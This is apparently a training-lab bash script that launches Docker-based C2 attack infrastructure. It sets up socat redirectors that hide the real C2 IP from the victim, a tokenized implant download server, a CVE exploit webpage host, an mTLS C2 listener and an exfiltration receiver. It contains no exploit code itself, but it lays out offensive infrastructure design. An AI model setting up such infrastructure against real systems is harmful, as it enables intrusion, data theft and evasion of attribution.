#!/bin/bash

# ─────────────────────────────────────────────
#  Capstone Docker Lab — Launch Script
# ─────────────────────────────────────────────

set -eo pipefail
# Note: use || true on commands that are allowed to fail (e.g. docker compose down with nothing running)

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ENV_FILE="$SCRIPT_DIR/.env"
COMPOSE_FILE="$SCRIPT_DIR/docker-compose.yml"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# ── WSL detection ──────────────────────────────────────────────────────────
IS_WSL=0
POWERSHELL_CMD=""
if grep -qiE "microsoft|wsl" /proc/version 2>/dev/null; then
    IS_WSL=1
    if command -v powershell.exe &>/dev/null; then
        POWERSHELL_CMD="powershell.exe"
    elif [ -f "/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe" ]; then
        POWERSHELL_CMD="/mnt/c/Windows/System32/WindowsPowerShell/v1.0/powershell.exe"
    fi
fi

# ── add_ip_alias <ip> <iface> ──────────────────────────────────────────────
# On Linux: sudo ip addr add <ip>/24 dev <iface>
# On WSL:   netsh via powershell.exe; falls back to printing manual instructions
#           if the process isn't elevated on the Windows side.
add_ip_alias() {
    local ip="$1"
    local iface="$2"
    
    # Strip any existing quotes from iface name
    iface=$(echo "$iface" | sed "s/['\"]//g")

    if [ "$IS_WSL" -eq 1 ]; then
        if [ -n "$POWERSHELL_CMD" ]; then
            local result
            # Use escaped double quotes for the interface name (Windows standard)
            result=$("$POWERSHELL_CMD" -Command "netsh interface ip add address \\\"$iface\\\" $ip 255.255.255.0" 2>&1 | tr -d '\r') || true
            
            if echo "$result" | grep -qiE "ok|completed successfully"; then
                return 0
            fi
            
            echo -e "${YELLOW}[!] Could not add alias automatically.${NC}"
            if [ -n "$result" ]; then
                echo -e "    ${RED}Error: $result${NC}"
            fi
        else
            echo -e "${YELLOW}[!] powershell.exe not found (tried PATH and /mnt/c/). Skipping automatic alias addition.${NC}"
        fi

        echo -e "    Open an ${RED}admin${NC} PowerShell on Windows and run:"
        echo -e "    ${CYAN}netsh interface ip add address \"$iface\" $ip 255.255.255.0${NC}"
        read -rp "    Press Enter once done (or Enter to skip and continue): "
    else
        if sudo ip addr add "${ip}/24" dev "$iface" 2>/dev/null; then
            return 0
        fi
        return 1
    fi
}

echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}       Capstone Docker Lab — Launch Script      ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""

# ── 1. Check dependencies ─────────────────────
echo -e "${YELLOW}[*] Checking dependencies...${NC}"

if ! command -v docker &>/dev/null; then
    echo -e "${RED}[!] Docker is not installed. Install it and try again.${NC}"
    exit 1
fi

if ! docker compose version &>/dev/null; then
    echo -e "${RED}[!] Docker Compose plugin not found. Install it and try again.${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Docker and Docker Compose found.${NC}"

# ── 2. Detect available host IPs ─────────────
echo ""
echo -e "${YELLOW}[*] Detecting network interfaces...${NC}"
echo ""

HOSTONLY_IP=""
HOSTONLY_IFACE=""

if [ "$IS_WSL" -eq 1 ]; then
    echo -e "    ${CYAN}Running inside WSL — querying Windows network adapters via PowerShell.${NC}"
    echo -e "    ${YELLOW}NOTE: VirtualBox must be installed on Windows with a Host-Only adapter configured.${NC}"
    echo ""

    # Find any Windows adapter with a 192.168.56.x address (VirtualBox host-only default subnet).
    if [ -n "$POWERSHELL_CMD" ]; then
        HOSTONLY_IP=$("$POWERSHELL_CMD" -Command \
            "Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \$_.IPAddress -like '192.168.56.*' } | Select-Object -First 1 -ExpandProperty IPAddress" \
            2>/dev/null | tr -d '\r\n') || true

        HOSTONLY_IFACE=$("$POWERSHELL_CMD" -Command \
            "\$a = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \$_.IPAddress -like '192.168.56.*' } | Select-Object -First 1; if (\$a) { (Get-NetAdapter -InterfaceIndex \$a.InterfaceIndex).Name }" \
            2>/dev/null | tr -d '\r\n') || true
    fi

    if [ -n "$HOSTONLY_IP" ] && [ -n "$HOSTONLY_IFACE" ]; then
        echo -e "    ${GREEN}$HOSTONLY_IFACE${NC} → $HOSTONLY_IP  ${CYAN}← host-only adapter (192.168.56.x)${NC}"
    else
        echo -e "    ${YELLOW}[~] No adapter found on 192.168.56.x subnet.${NC}"
        
        if [ -n "$POWERSHELL_CMD" ]; then
            echo -e "    ${CYAN}Attempting to list Windows adapters...${NC}"
            echo ""

            # Robust PowerShell command to list Alias and IP
            mapfile -t ADAPTERS < <("$POWERSHELL_CMD" -Command 'Get-NetIPAddress -AddressFamily IPv4 | ForEach-Object { $_.InterfaceAlias + " | " + $_.IPAddress }' 2>/dev/null | grep -v '127.0.0.1' | grep -v '169.254.' | tr -d '\r') || true
        else
            ADAPTERS=()
        fi

        if [ ${#ADAPTERS[@]} -eq 0 ]; then
            echo -e "    ${YELLOW}[!] Could not detect adapters automatically.${NC}"
            echo -e "    ${CYAN}Please enter your VirtualBox interface details manually.${NC}"
            echo -e "    ${CYAN}(Note: Omit the word 'adapter' — e.g., use 'Ethernet 3' not 'Ethernet adapter Ethernet 3')${NC}"
            echo ""
            read -rp "    Enter Windows Interface Name (e.g. 'Ethernet 3'): " HOSTONLY_IFACE
            read -rp "    Enter Interface IP (e.g. 192.168.56.1): " HOSTONLY_IP
        else
            for i in "${!ADAPTERS[@]}"; do
                # Sanitize the name and IP
                NAME=$(echo "${ADAPTERS[$i]}" | cut -d'|' -f1 | sed 's/ *$//g' | tr -d '\r')
                IP=$(echo "${ADAPTERS[$i]}" | cut -d'|' -f2 | sed 's/^ *//g' | tr -d '\r')
                [ -z "$NAME" ] && continue
                echo -e "      [$((i+1))] '${GREEN}$NAME${NC}' → $IP"
            done
            echo -e "      [M] Enter interface name manually"
            echo ""
            read -rp "    Select your VirtualBox adapter [1-${#ADAPTERS[@]}] or 'M': " SELECTION

            if [[ "$SELECTION" =~ ^[0-9]+$ ]] && [ "$SELECTION" -ge 1 ] && [ "$SELECTION" -le "${#ADAPTERS[@]}" ]; then
                INDEX=$((SELECTION-1))
                HOSTONLY_IFACE=$(echo "${ADAPTERS[$INDEX]}" | cut -d'|' -f1 | sed 's/ *$//g' | tr -d '\r')
                HOSTONLY_IP=$(echo "${ADAPTERS[$INDEX]}" | cut -d'|' -f2 | sed 's/^ *//g' | tr -d '\r')
            else
                echo ""
                echo -e "    ${CYAN}(Note: Omit the word 'adapter' — e.g., use 'Ethernet 3' not 'Ethernet adapter Ethernet 3')${NC}"
                read -rp "    Enter Windows Interface Name (e.g. 'Ethernet 3'): " HOSTONLY_IFACE
                read -rp "    Enter Interface IP (e.g. 192.168.56.1): " HOSTONLY_IP
            fi
        fi
    fi
else
    echo -e "    ${YELLOW}NOTE: Your Windows VM must use a Host-Only adapter in VirtualBox.${NC}"
    echo -e "    The ${GREEN}vboxnet0${NC} IP is your real C2 machine IP."
    echo -e "    You will be prompted for a separate REDIRECTOR IP (an alias on the same interface)."
    echo -e "    The victim connects to the c2-redirector IP only — your real IP stays hidden."
    echo ""

    mapfile -t IFACES < <(ip -o -4 addr show | grep -v ' secondary ' | awk '{print $2, $4}' | grep -v '^lo ' | grep -v '127\.')

    if [ ${#IFACES[@]} -eq 0 ]; then
        echo -e "${RED}[!] No non-loopback IPv4 interfaces found.${NC}"
    else
        echo "    Available IPs:"
        for iface in "${IFACES[@]}"; do
            IFACE_NAME=$(echo "$iface" | awk '{print $1}')
            IFACE_IP=$(echo "$iface" | awk '{print $2}' | cut -d'/' -f1)
            if [[ "$IFACE_NAME" == vboxnet* || "$IFACE_NAME" == vmnet* ]]; then
                echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP  ${CYAN}← your C2 machine (host-only)${NC}"
                HOSTONLY_IP="$IFACE_IP"
                HOSTONLY_IFACE="$IFACE_NAME"
            else
                echo -e "      ${GREEN}$IFACE_NAME${NC} → $IFACE_IP"
            fi
        done
    fi
fi

# Auto-suggest a c2-redirector IP: increment the last octet by 9
# e.g. 192.168.56.1 → 192.168.56.10
if [ -n "$HOSTONLY_IP" ]; then
    _BASE=$(echo "$HOSTONLY_IP" | cut -d'.' -f1-3)
    _LAST=$(echo "$HOSTONLY_IP" | cut -d'.' -f4)
    SUGGESTED_REDIRECTOR_IP="${_BASE}.$(((_LAST + 9) % 255))"
    SUGGESTED_EXFIL_IP="${_BASE}.$(((_LAST + 10) % 255))"
fi

# ── 3. Prompt for c2-redirector IP ───────────────
echo ""
if [ ! -f "$ENV_FILE" ]; then
    echo -e "${YELLOW}[*] No .env file found — creating one now.${NC}"
fi

CURRENT_IP=$(grep -oP '(?<=C2_HOST_IP=)\S+' "$ENV_FILE" 2>/dev/null || echo "")

echo ""
echo -e "    ${CYAN}The REDIRECTOR IP is the address baked into the implant.${NC}"
echo -e "    ${CYAN}It will be added as an IP alias on ${HOSTONLY_IFACE:-vboxnet0} so Docker can bind to it.${NC}"
echo -e "    ${CYAN}Victim traffic hits this IP — your real C2 IP (${HOSTONLY_IP}) stays hidden.${NC}"
echo ""

if [ -n "$CURRENT_IP" ]; then
    echo -e "${YELLOW}[*] Current c2-redirector IP in .env: ${GREEN}$CURRENT_IP${NC}"
    read -rp "    Enter new c2-redirector IP (or press Enter to keep '$CURRENT_IP'): " INPUT_IP
    HOST_IP="${INPUT_IP:-$CURRENT_IP}"
elif [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
    echo -e "${YELLOW}[*] Your C2 machine IP: ${GREEN}${HOSTONLY_IP}${NC}"
    echo -e "${YELLOW}[*] Suggested c2-redirector IP: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}"
    read -rp "    Press Enter to use '${SUGGESTED_REDIRECTOR_IP}' or enter a different IP: " INPUT_IP
    HOST_IP="${INPUT_IP:-$SUGGESTED_REDIRECTOR_IP}"
else
    read -rp "    Enter c2-redirector IP to use (e.g. 192.168.56.10): " HOST_IP
fi

# Validate IP format
if ! echo "$HOST_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
    echo -e "${RED}[!] Invalid IP address: '$HOST_IP'. Exiting.${NC}"
    exit 1
fi

# Warn if c2-redirector IP == real C2 IP — no actual separation occurs
if [ -n "$HOSTONLY_IP" ] && [ "$HOST_IP" = "$HOSTONLY_IP" ]; then
    echo ""
    echo -e "${RED}[!] Redirector IP is the same as your real C2 IP (${HOSTONLY_IP}).${NC}"
    echo -e "    ${CYAN}This means there is NO IP separation — victim traffic will resolve directly to your C2 machine.${NC}"
    if [ -n "$SUGGESTED_REDIRECTOR_IP" ]; then
        echo -e "    ${CYAN}Suggested alias: ${GREEN}${SUGGESTED_REDIRECTOR_IP}${NC}${CYAN} (different address on the same interface)${NC}"
    fi
    echo ""
    read -rp "    Continue with the same IP anyway? (y/N): " SAME_IP_CONFIRM
    SAME_IP_CONFIRM="${SAME_IP_CONFIRM:-N}"
    if [[ ! "$SAME_IP_CONFIRM" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Exiting. Re-run and enter a different c2-redirector IP.${NC}"
        exit 1
    fi
    IP_SEPARATION=0
else
    IP_SEPARATION=1
fi

echo -e "${GREEN}[+] Using c2-redirector IP (C2_HOST_IP): ${HOST_IP}${NC}"

# ── 3a. Add IP alias so Docker can bind the c2-redirector port to HOST_IP ──
if [ -n "$HOSTONLY_IFACE" ] && [ "$HOST_IP" != "$HOSTONLY_IP" ]; then
    echo ""
    echo -e "${YELLOW}[*] Adding IP alias ${HOST_IP} on ${HOSTONLY_IFACE}...${NC}"
    if add_ip_alias "$HOST_IP" "$HOSTONLY_IFACE"; then
        echo -e "${GREEN}[+] C2 redirector alias added — victim connects to ${HOST_IP}, not ${HOSTONLY_IP}.${NC}"
    else
        echo -e "${CYAN}[~] Alias already exists or could not be added (continuing).${NC}"
    fi
fi

# ── 3b. Prompt for exfil-redirector IP ────────────────────────────
echo ""
CURRENT_EXFIL_IP=$(grep -oP '(?<=EXFIL_HOST_IP=)\S+' "$ENV_FILE" 2>/dev/null || echo "")

echo -e "    ${CYAN}The EXFIL REDIRECTOR IP is baked into the implant for the exfil channel (port 9443).${NC}"
echo -e "    ${CYAN}It should be a different alias than the C2 redirector IP (${HOST_IP}).${NC}"
echo ""

if [ -n "$CURRENT_EXFIL_IP" ]; then
    echo -e "${YELLOW}[*] Current exfil-redirector IP in .env: ${GREEN}$CURRENT_EXFIL_IP${NC}"
    read -rp "    Enter new exfil-redirector IP (or press Enter to keep '$CURRENT_EXFIL_IP'): " INPUT_EXFIL_IP
    EXFIL_IP="${INPUT_EXFIL_IP:-$CURRENT_EXFIL_IP}"
elif [ -n "$SUGGESTED_EXFIL_IP" ]; then
    echo -e "${YELLOW}[*] Suggested exfil-redirector IP: ${GREEN}${SUGGESTED_EXFIL_IP}${NC}"
    read -rp "    Press Enter to use '${SUGGESTED_EXFIL_IP}' or enter a different IP: " INPUT_EXFIL_IP
    EXFIL_IP="${INPUT_EXFIL_IP:-$SUGGESTED_EXFIL_IP}"
else
    read -rp "    Enter exfil-redirector IP to use (e.g. 192.168.56.11): " EXFIL_IP
fi

if ! echo "$EXFIL_IP" | grep -qE '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
    echo -e "${RED}[!] Invalid IP address: '$EXFIL_IP'. Exiting.${NC}"
    exit 1
fi

if [ "$EXFIL_IP" = "$HOST_IP" ]; then
    echo -e "${YELLOW}[!] Exfil redirector IP is the same as C2 redirector IP — no IP separation between channels.${NC}"
fi

echo -e "${GREEN}[+] Using exfil-redirector IP (EXFIL_HOST_IP): ${EXFIL_IP}${NC}"

# ── 3c. Add IP alias for exfil-redirector ─────────────────────────
if [ -n "$HOSTONLY_IFACE" ] && [ "$EXFIL_IP" != "$HOSTONLY_IP" ]; then
    echo ""
    echo -e "${YELLOW}[*] Adding IP alias ${EXFIL_IP} on ${HOSTONLY_IFACE}...${NC}"
    if add_ip_alias "$EXFIL_IP" "$HOSTONLY_IFACE"; then
        echo -e "${GREEN}[+] Exfil redirector alias added — implant exfil POSTs to ${EXFIL_IP}, not ${HOSTONLY_IP}.${NC}"
    else
        echo -e "${CYAN}[~] Alias already exists or could not be added (continuing).${NC}"
    fi
fi

# ── 3b. Generate tokens (BP2 enrollment + BP3 download) ───────────
echo ""
echo -e "${YELLOW}[*] Generating tokens (BP2 enrollment + BP3 download)...${NC}"

# DOWNLOAD_TOKEN is always refreshed — each run serves a new implant binary.
DOWNLOAD_TOKEN=$(openssl rand -hex 32)

# ENROLLMENT_TOKEN is preserved when the CA is reused so that already-installed
# implants (which have the old token baked in) can still re-enroll after a
# c2-server rebuild.  Generate a new one only when no token exists yet
# (i.e. the very first launch.sh run, or after a deliberate CA rotation).
EXISTING_ENROLLMENT=$(grep -oP '(?<=ENROLLMENT_TOKEN=)\S+' "$ENV_FILE" 2>/dev/null || echo "")
CA_EXISTS=$( [ -f "$SCRIPT_DIR/certs/ca.key" ] && [ -f "$SCRIPT_DIR/certs/ca.crt" ] && echo "yes" || echo "no" )

if [ "$CA_EXISTS" = "yes" ] && [ -n "$EXISTING_ENROLLMENT" ]; then
    ENROLLMENT_TOKEN="$EXISTING_ENROLLMENT"
    echo -e "${GREEN}[+] DOWNLOAD_TOKEN generated (new); ENROLLMENT_TOKEN preserved (CA reused)${NC}"
else
    ENROLLMENT_TOKEN=$(openssl rand -hex 16)
    echo -e "${GREEN}[+] DOWNLOAD_TOKEN and ENROLLMENT_TOKEN generated (new PKI epoch)${NC}"
fi

# Write to .env
cat > "$ENV_FILE" <<EOF
# C2 redirector IP — baked into implant.exe for the C2 channel (port 443).
# IP alias on the host-only interface, distinct from the real C2 machine IP.
# Regenerated by launch.sh on $(date)
C2_HOST_IP=${HOST_IP}

# Exfil redirector IP — baked into implant.exe for the exfil channel (port 9443).
# A separate IP alias, keeping C2 and exfil traffic on distinct IPs.
EXFIL_HOST_IP=${EXFIL_IP}

# Single-use download token (Section 9 / BP3). Embedded in shellcode.
DOWNLOAD_TOKEN=${DOWNLOAD_TOKEN}

# Single-use enrollment token (BP2). Baked into implant.exe at build time.
# The controller validates this token when the implant presents its CSR.
# Preserved across restarts when the CA is reused — rotate by deleting
# certs/ca.key + certs/ca.crt before running launch.sh.
ENROLLMENT_TOKEN=${ENROLLMENT_TOKEN}
EOF

echo -e "${GREEN}[+] .env written.${NC}"

# ── 3c. Generate PKI (CA, controller, implant 30-day, nginx) ──────
echo ""
echo -e "${YELLOW}[*] Generating PKI — CA, controller cert, implant cert (30-day), nginx cert...${NC}"
CERT_SCRIPT="$SCRIPT_DIR/certs/generate_certs.sh"
if [ ! -f "$CERT_SCRIPT" ]; then
    echo -e "${RED}[!] certs/generate_certs.sh not found.${NC}"
    exit 1
fi
if ! bash "$CERT_SCRIPT" "$HOST_IP" 2>&1 | sed 's/^/    /'; then
    echo -e "${RED}[!] PKI generation failed.${NC}"
    exit 1
fi
echo -e "${GREEN}[+] PKI generated (implant cert expires in 30 days — BP4).${NC}"

# ── 4. Stop any existing lab containers ───────
echo ""
echo -e "${YELLOW}[*] Stopping any existing lab containers...${NC}"
docker compose -f "$COMPOSE_FILE" down 2>/dev/null || true
echo -e "${GREEN}[+] Ready to rebuild.${NC}"

# ── 5. Check for port conflicts ───────────────
echo ""
echo -e "${YELLOW}[*] Checking for port conflicts (443, 8443, 8888, 9443)...${NC}"
echo -e "    ${CYAN}(Port 443 is now owned by the c2-redirector container — c2-server has no direct host port)${NC}"

CONFLICT=0
if [ "$IS_WSL" -eq 1 ]; then
    # ss inside WSL only sees WSL's network stack, not Windows host ports.
    # Docker Desktop binds on the Windows side, so use netstat.exe instead.
    for PORT in 443 8443 8888 9443; do
        if netstat.exe -ano 2>/dev/null | grep -qE "[:.]${PORT}\s"; then
            echo -e "${RED}[!] Port $PORT is already in use on Windows.${NC}"
            CONFLICT=1
        fi
    done
else
    for PORT in 443 8443 8888 9443; do
        if ss -tlnp 2>/dev/null | grep -q ":${PORT} "; then
            echo -e "${RED}[!] Port $PORT is already in use.${NC}"
            CONFLICT=1
        fi
    done
fi

if [ $CONFLICT -eq 1 ]; then
    read -rp "    Port conflicts detected. Continue anyway? (y/N): " CONFIRM
    CONFIRM="${CONFIRM:-N}"
    if [[ ! "$CONFIRM" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Exiting. Free up the conflicting ports and try again.${NC}"
        exit 1
    fi
else
    echo -e "${GREEN}[+] No port conflicts.${NC}"
fi

# ── 7. Build and launch ───────────────────────
echo ""
echo -e "${YELLOW}[*] Building and launching containers (this may take a few minutes)...${NC}"
echo ""

docker compose -f "$COMPOSE_FILE" up --build -d

# ── 8. Verify containers are running ─────────
echo ""
echo -e "${YELLOW}[*] Verifying containers started...${NC}"
sleep 3

ALL_UP=1
for NAME in c2-redirector c2-server delivery-server exploit-server exfil-redirector exfil-receiver; do
    STATUS=$(docker inspect --format='{{.State.Status}}' "$NAME" 2>/dev/null || echo "missing")
    if [ "$STATUS" = "running" ]; then
        echo -e "    ${GREEN}[+] $NAME is running${NC}"
    else
        echo -e "    ${RED}[!] $NAME is NOT running (status: $STATUS)${NC}"
        ALL_UP=0
    fi
done

# ── 9. Summary ────────────────────────────────
echo ""
echo -e "${CYAN}================================================${NC}"
echo -e "${CYAN}                    Summary                     ${NC}"
echo -e "${CYAN}================================================${NC}"
echo ""
if [ "${IP_SEPARATION:-1}" -eq 1 ]; then
local_label="your Linux host"
[ "$IS_WSL" -eq 1 ] && local_label="your Windows host (WSL)"
echo -e "  IP separation:"
echo -e "    Real C2 machine      → ${CYAN}${HOSTONLY_IP}${NC}  (${local_label} — victim never sees this)"
echo -e "    C2 redirector IP     → ${GREEN}${HOST_IP}${NC}  (alias on ${HOSTONLY_IFACE:-vboxnet0} — baked into implant for C2)"
echo -e "    Exfil redirector IP  → ${GREEN}${EXFIL_IP}${NC}  (alias on ${HOSTONLY_IFACE:-vboxnet0} — baked into implant for exfil)"
else
echo -e "  ${RED}[!] No IP separation — c2-redirector and real C2 are both ${HOST_IP}${NC}"
echo -e "      Re-run and choose a different c2-redirector IP (e.g. ${SUGGESTED_REDIRECTOR_IP:-<alias IP>}) for proper separation."
fi
echo ""
echo -e "  Traffic path (C2):    victim → ${GREEN}${HOST_IP}:443${NC} (c2-redirector) → ${GREEN}c2-server:443${NC} (backnet only)"
echo -e "  Traffic path (exfil): victim → ${GREEN}${EXFIL_IP}:9443${NC} (exfil-redirector) → ${GREEN}exfil-receiver:9443${NC} (exfilnet only)"
echo ""
echo -e "  Containers:"
echo -e "    Machine 1 — c2-redirector       ${GREEN}${HOST_IP}:443${NC}    socat relay (frontnet+backnet)"
echo -e "    Machine 2 — c2-server           backnet only            mTLS C2 listener"
echo -e "    Machine 3 — delivery-server     ${GREEN}${HOST_IP}:8443${NC}   nginx implant download"
echo -e "    Machine 4 — exploit-server      ${GREEN}${HOST_IP}:8888${NC}   CVE exploit webpage"
echo -e "    Machine 5 — exfil-redirector    ${GREEN}${EXFIL_IP}:9443${NC}  socat relay (frontnet+exfilnet)"
echo -e "    Machine 6 — exfil-receiver      exfilnet only           HTTPS exfil data sink"
echo ""
echo -e "  From Windows VM:"
echo -e "  Exploit webpage  → ${GREEN}http://${HOST_IP}:8888${NC}"
echo -e "  Download implant → ${GREEN}https://${HOST_IP}:8443/update/${DOWNLOAD_TOKEN}${NC}  (in shellcode)"
echo -e "  C2 connects to   → ${GREEN}${HOST_IP}:443${NC}   (c2-redirector — not the real C2 IP)"
echo -e "  Exfil uploads to → ${GREEN}https://${EXFIL_IP}:9443${NC}  (exfil-redirector — not the real C2 IP)"
echo -e "  Real C2 server   → ${CYAN}backnet only — unreachable from victim network${NC}"
echo ""
echo -e "  Attach to C2 controller:"
echo -e "    ${CYAN}sudo docker attach c2-server${NC}"
echo -e "  Detach without stopping: ${CYAN}Ctrl+P then Ctrl+Q${NC}"
echo ""

if [ $ALL_UP -eq 1 ]; then
    echo -e "${GREEN}[+] Lab is up and ready.${NC}"
else
    echo -e "${RED}[!] One or more containers failed to start. Check logs:${NC}"
    echo -e "    ${CYAN}docker compose logs -f${NC}"
fi

echo ""
